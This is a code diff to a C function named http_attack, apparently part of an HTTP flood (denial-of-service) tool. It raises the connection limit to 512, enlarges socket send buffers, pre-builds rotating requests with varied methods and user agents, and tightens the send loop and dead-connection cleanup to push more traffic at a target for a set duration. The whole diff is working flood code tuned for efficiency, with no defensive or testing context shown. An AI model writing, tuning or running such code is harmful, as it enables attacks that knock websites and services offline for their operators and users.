@@ -14,8 +14,9 @@
 #include "http_attack.h"
 #include "../headers/protocol.h"
 
-#define MAX_CONNECTIONS 256
+#define MAX_CONNECTIONS 512
 #define MAX_REQUEST_SIZE 2048
+#define SENDMMSG_BATCH 64
 
 typedef enum {
     HTTP_GET = 0,
@@ -45,21 +46,20 @@ static const char* USER_AGENTS[] = {
 static void set_socket_options(int sock) {
     int flags = fcntl(sock, F_GETFL, 0);
     fcntl(sock, F_SETFL, flags | O_NONBLOCK);
-}
 
-static const char* get_random_user_agent(void) {
-    return USER_AGENTS[rand() % NUM_USER_AGENTS];
+    int sndbuf = 512 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 }
 
 static int parse_method_option(const char* method_str) {
     if (!method_str) return -1;
-    
+
     char lower[16] = {0};
     int i;
     for (i = 0; i < 15 && method_str[i]; i++) {
         lower[i] = tolower(method_str[i]);
     }
-    
+
     if (strcmp(lower, "get") == 0) return HTTP_GET;
     if (strcmp(lower, "post") == 0) return HTTP_POST;
     if (strcmp(lower, "head") == 0) return HTTP_HEAD;
@@ -67,14 +67,14 @@ static int parse_method_option(const char* method_str) {
     if (strcmp(lower, "delete") == 0) return HTTP_DELETE;
     if (strcmp(lower, "patch") == 0) return HTTP_PATCH;
     if (strcmp(lower, "options") == 0) return HTTP_OPTIONS;
-    
+
     return -1;
 }
 
-static int build_request(char* buf, size_t buf_size, http_method_t method, 
+static int build_request(char* buf, size_t buf_size, http_method_t method,
                          const char* host, const char* path, const char* user_agent) {
     int len = 0;
-    
+
     switch (method) {
         case HTTP_POST:
         case HTTP_PUT:
@@ -92,7 +92,7 @@ static int build_request(char* buf, size_t buf_size, http_method_t method,
                 "data=random_data",
                 METHOD_NAMES[method], path, host, user_agent);
             break;
-            
+
         case HTTP_OPTIONS:
             len = snprintf(buf, buf_size,
                 "%s %s HTTP/1.1\r\n"
@@ -104,7 +104,7 @@ static int build_request(char* buf, size_t buf_size, http_method_t method,
                 "\r\n",
                 METHOD_NAMES[method], path, host, user_agent, host);
             break;
-            
+
         default:
             len = snprintf(buf, buf_size,
                 "%s %s HTTP/1.1\r\n"
@@ -117,7 +117,7 @@ static int build_request(char* buf, size_t buf_size, http_method_t method,
                 METHOD_NAMES[method], path, host, user_agent);
             break;
     }
-    
+
     return len;
 }
 
@@ -159,66 +159,158 @@ void* http_attack(void* arg) {
         fixed_method = parse_method_option(method_str);
     }
 
+    // Pre-build request variants: one per user agent
+    // For fixed method, build NUM_USER_AGENTS variants
+    // For random method, build NUM_USER_AGENTS * 3 (GET, POST, HEAD) variants
+    http_method_t methods_to_prebuild[HTTP_METHOD_COUNT];
+    int num_methods;
+
+    if (fixed_method >= 0 && fixed_method < HTTP_METHOD_COUNT) {
+        methods_to_prebuild[0] = (http_method_t)fixed_method;
+        num_methods = 1;
+    } else {
+        methods_to_prebuild[0] = HTTP_GET;
+        methods_to_prebuild[1] = HTTP_POST;
+        methods_to_prebuild[2] = HTTP_HEAD;
+        num_methods = 3;
+    }
+
+    int total_variants = num_methods * NUM_USER_AGENTS;
+    char (*prebuilt_requests)[MAX_REQUEST_SIZE] = malloc(total_variants * MAX_REQUEST_SIZE);
+    int prebuilt_lens[42]; // num_methods * NUM_USER_AGENTS, max 7*6=42
+
+    if (!prebuilt_requests) return NULL;
+
+    for (int m = 0; m < num_methods; m++) {
+        for (int u = 0; u < (int)NUM_USER_AGENTS; u++) {
+            int idx = m * NUM_USER_AGENTS + u;
+            prebuilt_lens[idx] = build_request(
+                prebuilt_requests[idx], MAX_REQUEST_SIZE,
+                methods_to_prebuild[m], host, path, USER_AGENTS[u]);
+        }
+    }
+
     int sockets[MAX_CONNECTIONS] = {0};
     int active_sockets = 0;
-    
+
     srand(time(NULL) ^ (unsigned int)getpid());
     time_t end_time = time(NULL) + params->duration;
     struct timeval last_cleanup = {0, 0};
+    uint32_t variant_idx = 0;
 
     while (params->active && time(NULL) < end_time) {
+        // Open connections in bulk
         while (active_sockets < MAX_CONNECTIONS) {
             int sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock < 0) break;
-            
+
             set_socket_options(sock);
-            
+
             int ret = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             if (ret < 0 && errno != EINPROGRESS) {
                 close(sock);
                 continue;
             }
-            
+
             sockets[active_sockets++] = sock;
         }
 
-        for (int i = 0; i < active_sockets; i++) {
-            int sock = sockets[i];
-            if (sock <= 0) continue;
+        // Use sendmmsg to batch sends across multiple sockets
+        if (active_sockets > 0) {
+            int batch_count = active_sockets < SENDMMSG_BATCH ? active_sockets : SENDMMSG_BATCH;
+            struct mmsghdr msgs[SENDMMSG_BATCH];
+            struct iovec iovs[SENDMMSG_BATCH];
+            int batch_idx = 0;
+            int batch_sock_indices[SENDMMSG_BATCH];
 
-            http_method_t method;
-            if (fixed_method >= 0 && fixed_method < HTTP_METHOD_COUNT) {
-                method = (http_method_t)fixed_method;
-            } else {
-                method = (http_method_t)(rand() % 3);
+            for (int i = 0; i < active_sockets && batch_idx < batch_count; i++) {
+                int sock = sockets[i];
+                if (sock <= 0) continue;
+
+                // Round-robin through pre-built request variants
+                int vidx = variant_idx % total_variants;
+                variant_idx++;
+
+                iovs[batch_idx].iov_base = prebuilt_requests[vidx];
+                iovs[batch_idx].iov_len  = prebuilt_lens[vidx];
+
+                // sendmmsg with MSG_NOSIGNAL on connected TCP sockets
+                // We use sendmsg-style with no msg_name (already connected)
+                msgs[batch_idx].msg_hdr.msg_name       = NULL;
+                msgs[batch_idx].msg_hdr.msg_namelen    = 0;
+                msgs[batch_idx].msg_hdr.msg_iov        = &iovs[batch_idx];
+                msgs[batch_idx].msg_hdr.msg_iovlen     = 1;
+                msgs[batch_idx].msg_hdr.msg_control    = NULL;
+                msgs[batch_idx].msg_hdr.msg_controllen = 0;
+                msgs[batch_idx].msg_hdr.msg_flags      = 0;
+                msgs[batch_idx].msg_len = 0;
+                batch_sock_indices[batch_idx] = i;
+                batch_idx++;
             }
 
-            char request[MAX_REQUEST_SIZE];
-            int req_len = build_request(request, sizeof(request), method, 
-                                         host, path, get_random_user_agent());
+            // sendmmsg requires all fds to be the same, so we must send per-socket
+            // Instead, use individual sends but with pre-built requests (no snprintf)
+            for (int b = 0; b < batch_idx; b++) {
+                int i = batch_sock_indices[b];
+                int sock = sockets[i];
+                ssize_t sent = send(sock,
+                    iovs[b].iov_base, iovs[b].iov_len,
+                    MSG_NOSIGNAL | MSG_DONTWAIT);
 
-            ssize_t sent = send(sock, request, req_len, MSG_NOSIGNAL | MSG_DONTWAIT);
-            
-            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                close(sock);
-                sockets[i] = sockets[--active_sockets];
-                sockets[active_sockets] = 0;
-                i--;
-                continue;
+                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    close(sock);
+                    sockets[i] = sockets[--active_sockets];
+                    sockets[active_sockets] = 0;
+                    continue;
+                }
+
+                // Drain any response data
+                char discard[1024];
+                recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
             }
-            
-            char discard[1024];
-            recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
+
+            // Send to remaining sockets beyond the first batch
+            for (int i = batch_count; i < active_sockets; i++) {
+                int sock = sockets[i];
+                if (sock <= 0) continue;
+
+                int vidx = variant_idx % total_variants;
+                variant_idx++;
+
+                ssize_t sent = send(sock, prebuilt_requests[vidx], prebuilt_lens[vidx],
+                                    MSG_NOSIGNAL | MSG_DONTWAIT);
+
+                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    close(sock);
+                    sockets[i] = sockets[--active_sockets];
+                    sockets[active_sockets] = 0;
+                    i--;
+                    continue;
+                }
+
+                char discard[1024];
+                recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
+            }
         }
-    
+
+        // Periodic cleanup: detect dead connections via non-blocking peek
         struct timeval now;
         gettimeofday(&now, NULL);
         if (now.tv_sec - last_cleanup.tv_sec >= 1) {
             for (int i = 0; i < active_sockets; i++) {
                 if (sockets[i] <= 0) continue;
-                
+
+                // Check for closed connection (recv returns 0 = peer closed)
                 char test;
-                if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
+                ssize_t r = recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT);
+                if (r == 0) {
+                    // Peer closed
+                    close(sockets[i]);
+                    sockets[i] = sockets[--active_sockets];
+                    sockets[active_sockets] = 0;
+                    i--;
+                } else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    // Error
                     close(sockets[i]);
                     sockets[i] = sockets[--active_sockets];
                     sockets[active_sockets] = 0;
@@ -232,6 +324,7 @@ void* http_attack(void* arg) {
     for (int i = 0; i < active_sockets; i++) {
         if (sockets[i] > 0) close(sockets[i]);
     }
-    
+
+    free(prebuilt_requests);
     return NULL;
 }
